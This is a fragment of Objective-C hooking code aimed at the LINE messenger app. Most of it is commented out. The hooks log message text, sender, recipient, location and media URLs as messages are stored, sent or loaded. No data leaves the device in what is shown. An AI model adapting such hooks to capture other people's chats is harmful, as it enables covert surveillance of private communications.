//	DLog (@"version %d", version)
//	DLog (@"block %@", block)
//    CALL_ORIG(LineStickerPackage, downloadImageForSticker$type$version$completionBlock$, sticker, type, version, block);
//	
//}

/*
HOOK(NLAudioURLLoader, loadAudioWithObjectID$knownDownloadURL$, void, id objectID, id url) {
	DLog (@"........................... load audio ....................")
	CALL_ORIG(NLAudioURLLoader, loadAudioWithObjectID$knownDownloadURL$, objectID, url);		
	DLog (@"object id %@", objectID)
	DLog (@"url %@", url)
}
HOOK(NLAudioURLLoader, finishLoadingAudioWithURL$, void, id url) {
	DLog (@"........................... finishLoadingAudioWithURL ....................")
	CALL_ORIG(NLAudioURLLoader, finishLoadingAudioWithURL$, url);		
	DLog (@"url %@", url)
}
HOOK(NLAudioURLLoader, informLoadingFailure$, void, id failure) {
	DLog (@"........................... informLoadingFailure ....................")
	CALL_ORIG(NLAudioURLLoader, informLoadingFailure$, failure);		
	DLog (@"failure %@", failure)
}
HOOK(NLMovieURLLoader, loadMovieWithOBSParameters$, void, id obsparameters) {
	DLog (@"........................... loadMovieWithOBSParameters ....................")
	CALL_ORIG(NLMovieURLLoader, loadMovieWithOBSParameters$, obsparameters);		
	DLog (@"obsparameters %@", obsparameters)
}

// called
HOOK(NLMovieURLLoader, loadMovieAtURL$withMessageID$knownDownloadURL$completion$, void, id url, id messageID, id url3, id completion) {
	DLog (@"........................... loadMovieAtURL withMessageID....................")
	CALL_ORIG(NLMovieURLLoader, loadMovieAtURL$withMessageID$knownDownloadURL$completion$, url, messageID, url3, completion);		
	DLog (@"url %@", url)					//  assets-library://asset/asset.mp4?id=FC747973-E898-48A8-97D8-C884B196B333&ext=mp4
	DLog (@"url3 %@", url3)					// (null)
	DLog (@"messageID %@", messageID)		// 263923193532
	DLog (@"completion %@", completion)
	
}
// called
HOOK(NLMovieURLLoader, loadMovieAtURL$withOBSParameters$completion$, void, id url, id obsparameters, id completion) {
	DLog (@"........................... loadMovieAtURL withOBSParameters....................")
	CALL_ORIG(NLMovieURLLoader, loadMovieAtURL$withOBSParameters$completion$, url, obsparameters, completion);		
	DLog (@"url %@", url)						//  assets-library://asset/asset.mp4?id=FC747973-E898-48A8-97D8-C884B196B333&ext=mp4
	DLog (@"obsparameters %@", obsparameters)	//<NLObjectStorageOperationParameters: 0x9588b40>
	DLog (@"completion %@", completion)			// <__NSStackBlock__: 0x2fdfde08>
}
// called
HOOK(NLMovieURLLoader, finishLoadingMovieWithURL$, void, id url) {
	DLog (@"........................... finishLoadingMovieWithURL ....................")
	DLog (@"url %@", url)
	CALL_ORIG(NLMovieURLLoader, finishLoadingMovieWithURL$, url);		
	//	DLog (@"saving ....")
	//	
	//	Class $MessageViewController = objc_getClass("MessageViewController");
	//	MessageViewController *msgVC = [$MessageViewController viewController];
	//	NLMoviePlayerController *moviePlayerC = [msgVC moviePlayerController];
	//	[moviePlayerC save:nil];			
	//	DLog (@"done ....")	
}

HOOK(NLMovieURLLoader, informLoadingFailure$, void, id failure) {
	DLog (@"........................... informLoadingFailure ....................")
	CALL_ORIG(NLMovieURLLoader, informLoadingFailure$, failure);		
	DLog (@"failure %@", failure)
}

HOOK(NLMoviePlayerController, save$, void, id save) {
	DLog (@"........................... save ....................")
	CALL_ORIG(NLMoviePlayerController, save$, save);		
	DLog (@"save %@", save)
}

HOOK(TalkChatObject, addMessages$, void, id aMsgObj) {
	DLog (@"addMessages, aMsgObj = %@", aMsgObj);	
    CALL_ORIG(TalkChatObject, addMessages$, aMsgObj);	
}


#pragma mark ChatDAO

HOOK(ChatDAO, insertMessage$inChat$, void, id message, id chat) {
	DLog (@">>>>>>>>>>>>>>>>>>>>> ChatDAO --> insertMessage");	
	DLog (@"insertMessage %@", message)
	DLog (@"chat %@", chat)
    CALL_ORIG(ChatDAO, insertMessage$inChat$, message, chat);	
}

#pragma mark ChatService

HOOK(ChatService, sendMessage$usingRequestSequence$whenFinished$errorBlock$, void, id message, int sequence, id finished, id block) {
	DLog (@">>>>>>>>>>>>>>>>>>>>> ChatService --> sendMessage");
	
    CALL_ORIG(ChatService, sendMessage$usingRequestSequence$whenFinished$errorBlock$, message, sequence, finished, block);	
}

#pragma mark TalkTextView

HOOK(TalkTextView, insertText$, void, id text) {
	DLog (@">>>>>>>>>>>>>>>>>>>>> TalkTextView");	
    CALL_ORIG(TalkTextView, insertText$, text);
	
}

#pragma mark TalkMessageObject

HOOK(TalkMessageObject, line_updateWithLineMessage$, void, id lineMessage) {
	DLog (@">>>>>>>>>>>>>>>>>>>>> TalkMessageObject --> line_updateWithLineMessage");
	DLog (@"lineMessage %@", lineMessage)
	CALL_ORIG(TalkMessageObject, line_updateWithLineMessage$, lineMessage);	
}

HOOK(TalkMessageObject, insertWithMessage$reqSeq$inManagedObjectContext$ ,id,  id message, int seq, id managedObjectContext) {
	DLog (@">>>>>>>>>>>>>>>>>>>>>  TalkMessageObject --> insertWithMessage$reqSeq$inManagedObjectContext$ %@ %d", [NSThread currentThread], [NSThread isMainThread]);
	DLog (@"message %@", message)
	DLog (@"seq %d", seq)
	//DLog (@"managedObjectContext %@", managedObjectContext)
	
	id returnValue				= CALL_ORIG(TalkMessageObject, insertWithMessage$reqSeq$inManagedObjectContext$ , message, seq, managedObjectContext);		

		
	DLog (@"contentPreviewIsSet %d", [message contentPreviewIsSet]);
	DLog (@"contentPreview %@", [message contentPreview]);
	DLog (@"contentMetadataIsSet %d", [message contentMetadataIsSet]);
	DLog (@"contentMetadata %@", [message contentMetadata]);
	DLog (@"contentTypeIsSet %d", [message contentTypeIsSet]);
	DLog (@"contentType %d", [message contentType]);
	DLog (@"hasContentIsSet %d", [message hasContentIsSet]);
	DLog (@"hasContent %d", [message hasContent]);
	DLog (@"locationIsSet %d", [message locationIsSet]);
	DLog (@"location %@", [message location]);
	DLog (@"textIsSet %d", [message textIsSet]);
	DLog (@"text %@", [message text]);
	DLog (@"deliveredTimeIsSet %d", [message deliveredTimeIsSet]);
	DLog (@"deliveredTime %d", [message deliveredTime]);
	DLog (@"createdTimeIsSet %d", [message createdTimeIsSet]);
	DLog (@"createdTime %d", [message createdTime])
	DLog (@"IDIsSet %d", [message IDIsSet])
	DLog (@"createdTimeIsSet %d", [message createdTimeIsSet])
	DLog (@"ID %@", [message ID])
	DLog (@"toTypeIsSet %d", [message toTypeIsSet])
	DLog (@"toType %d", [message toType])
	
	DLog (@"toIsSet %d", [message toIsSet])
	
	DLog (@"to %@", [message to])
	
	DLog (@"fromIsSet %d", [message fromIsSet])
	DLog (@"from %@", [message from])
	
	
	return returnValue;
}

HOOK(TalkMessageObject, line_sendContent, void) {
	DLog (@">>>>>>>>>>>>>>>>>>>>> TalkMessageObject --> line_sendContent");

	CALL_ORIG(TalkMessageObject, line_sendContent);	
}

HOOK(TalkMessageObject, line_uploadImage, void) {
	DLog (@">>>>>>>>>>>>>>>>>>>>> TalkMessageObject --> line_uploadImage");
	
	CALL_ORIG(TalkMessageObject, line_uploadImage);	
}
*/

#pragma mark _TalkChatObject

//HOOK(_TalkChatObject, insertInManagedObjectContext$, id, id managedObjectContext) {
//	DLog (@">>>>>>>>>>>>>>>>>>>>> _TalkChatObject --> insertInManagedObjectContext");	
//    return   CALL_ORIG(_TalkChatObject, insertInManagedObjectContext$, managedObjectContext);
//	
//}

#pragma mark TalkChatObject

//HOOK(TalkChatObject, insertWithMid$type$members$lastUpdated$inManagedObjectContext$, id, id mid, int type, id members, id updated, id inManagedObjectContext) {
//	DLog (@">>>>>>>>>>>>>>>>>>>>> TalkChatObject --> insertWithMid");
//	DLog (@"mid %@", mid)
//	DLog (@"type %d", type)
//	DLog (@"members %@", members)
//	DLog (@"updated %d", updated)
//	DLog (@"inManagedObjectContext %@", inManagedObjectContext)
//    return   CALL_ORIG(TalkChatObject, insertWithMid$type$members$lastUpdated$inManagedObjectContext$, mid, type, members, updated, inManagedObjectContext);	
//}
//HOOK(TalkChatObject, insertUnknownChatWithMid$type$inManagedObjectContext$, id, id mid, int type, id managedObjectContext) {
//	DLog (@">>>>>>>>>>>>>>>>>>>>> TalkChatObject --> insertUnknownChatWithMid");	
//    return   CALL_ORIG(TalkChatObject, insertUnknownChatWithMid$type$inManagedObjectContext$, mid, type, managedObjectContext);	
//}
//HOOK(TalkChatObject, insertOrUpdateRoom$inManagedObjectContext$, id, id room, id managedObjectContext) {
//	DLog (@">>>>>>>>>>>>>>>>>>>>> TalkChatObject --> insertOrUpdateRoom");	
//    return   CALL_ORIG(TalkChatObject, insertOrUpdateRoom$inManagedObjectContext$, room, managedObjectContext);	
//}
//HOOK(TalkChatObject, insertWithDictionary$inManagedObjectContext$, id, id room, id managedObjectContext) {
//	DLog (@">>>>>>>>>>>>>>>>>>>>> TalkChatObject --> insertWithDictionary");	
//    return   CALL_ORIG(TalkChatObject, insertWithDictionary$inManagedObjectContext$, room, managedObjectContext);	
//}
//HOOK(TalkChatObject, insertWithRoom$inManagedObjectContext$, id, id room, id managedObjectContext) {
//	DLog (@">>>>>>>>>>>>>>>>>>>>> TalkChatObject --> insertWithRoom");	
//    return   CALL_ORIG(TalkChatObject, insertWithRoom$inManagedObjectContext$, room, managedObjectContext);	
//}
//HOOK(TalkChatObject, insertWithUser$inManagedObjectContext$, id, id user, id managedObjectContext) {
//	DLog (@">>>>>>>>>>>>>>>>>>>>> TalkChatObject --> insertWithUser");	
//    return   CALL_ORIG(TalkChatObject, insertWithUser$inManagedObjectContext$, user, managedObjectContext);	
//}
//HOOK(TalkChatObject, insertWithGroup$inManagedObjectContext$, id, id room, id managedObjectContext) {
//	DLog (@">>>>>>>>>>>>>>>>>>>>> TalkChatObject --> insertWithGroup");	
//    return   CALL_ORIG(TalkChatObject, insertWithGroup$inManagedObjectContext$, room, managedObjectContext);	
//}
//HOOK(TalkChatObject, chatAutoCreateWithMID$type$inManagedObjectContext$, id, id mid, int type, id managedObjectContext) {
//	DLog (@">>>>>>>>>>>>>>>>>>>>> TalkChatObject --> chatAutoCreateWithMID");	
//	DLog (@"mid %@", mid)
//	DLog (@"type %d", type)
//	DLog (@"managedObjectContext %@", managedObjectContext)
//	
//    id returnValue =   CALL_ORIG(TalkChatObject, chatAutoCreateWithMID$type$inManagedObjectContext$, mid,  type, managedObjectContext);	
//	DLog (@"TalkChatObject returned %@", returnValue)
//	return returnValue;
//}
//HOOK(TalkChatObject, chatWithObjectID$inManagedObjectContext$, id, id room, id managedObjectContext) {
//	DLog (@">>>>>>>>>>>>>>>>>>>>> TalkChatObject --> chatWithObjectID");	
//    return   CALL_ORIG(TalkChatObject, chatWithObjectID$inManagedObjectContext$, room, managedObjectContext);	
//}
//HOOK(TalkChatObject, chatWithMID$inManagedObjectContext$, id, id room, id managedObjectContext) {
//	DLog (@">>>>>>>>>>>>>>>>>>>>> TalkChatObject --> chatWithMID");	
//    return   CALL_ORIG(TalkChatObject, chatWithMID$inManagedObjectContext$, room, managedObjectContext);	
//}
//HOOK(TalkChatObject, chatsInManagedObjectContext$, id, id managedObjectContext) {
//	DLog (@">>>>>>>>>>>>>>>>>>>>> TalkChatObject --> chatsInManagedObjectContext");	
//    return   CALL_ORIG(TalkChatObject, chatsInManagedObjectContext$, managedObjectContext);	
//}
//
//HOOK(TalkChatObject, sendMessageWithChatObject$text$requestSequence$image$location$latitude$sticker$contentType$metadata$, void, id chatObject, id text, int sequence, id image, id location, id latitude, unsigned sticker, unsigned type, id metadata) {
//	
//	DLog (@">>>>>>>>>>>>>>>>>>>>> TalkChatObject --> sendMessageWithChatObject");	
//	DLog (@"chatObject %@", chatObject)
//	DLog (@"text %@", text)
//	DLog (@"sequence %d", sequence)
//	DLog (@"image %@", image)
//	DLog (@"location %@", location)
//	DLog (@"latitude %@", latitude)
//	DLog (@"sticker %d", sticker)
//	DLog (@"type %d", type)
//	DLog (@"metadata %@", metadata)
//	
//   CALL_ORIG(TalkChatObject, sendMessageWithChatObject$text$requestSequence$image$location$latitude$sticker$contentType$metadata$, chatObject, text, sequence, image, location, latitude, sticker, type, metadata);	
//}
//HOOK(TalkChatObject, sendMessageWithImage$chatObject$, void, id image, id object) {
//	DLog (@">>>>>>>>>>>>>>>>>>>>> TalkChatObject --> sendMessageWithImage");	
//	DLog (@"image %@", image)
//	DLog (@"object %@", object)
//    CALL_ORIG(TalkChatObject, sendMessageWithImage$chatObject$,image, object);	
//}
//
//HOOK(TalkChatObject, updateLastReceivedMessageID$, void, id anID) {
//	DLog (@">>>>>>>>>>>>>>>>>>>>> TalkChatObject --> updateLastReceivedMessageID");	
//	DLog (@"anID %@", anID)
//    CALL_ORIG(TalkChatObject, updateLastReceivedMessageID$, anID);	
//}
//HOOK(TalkChatObject, syncChatAsReadUpToMessageWithID$, void, id anID) {
//	DLog (@">>>>>>>>>>>>>>>>>>>>> TalkChatObject --> syncChatAsReadUpToMessageWithID");	
//	DLog (@"anID %@", anID)
//    CALL_ORIG(TalkChatObject, syncChatAsReadUpToMessageWithID$, anID);	
//}
//HOOK(TalkChatObject, fetchReceivedMessageCountAfterMessageWithID$, unsigned, id anID) {
//	DLog (@">>>>>>>>>>>>>>>>>>>>> TalkChatObject --> fetchReceivedMessageCountAfterMessageWithID");	
//	DLog (@"anID %@", anID)
//    unsigned returnValue = CALL_ORIG(TalkChatObject, fetchReceivedMessageCountAfterMessageWithID$, anID);	
//	DLog (@"return value: %d", returnValue)
//	return returnValue;
//}


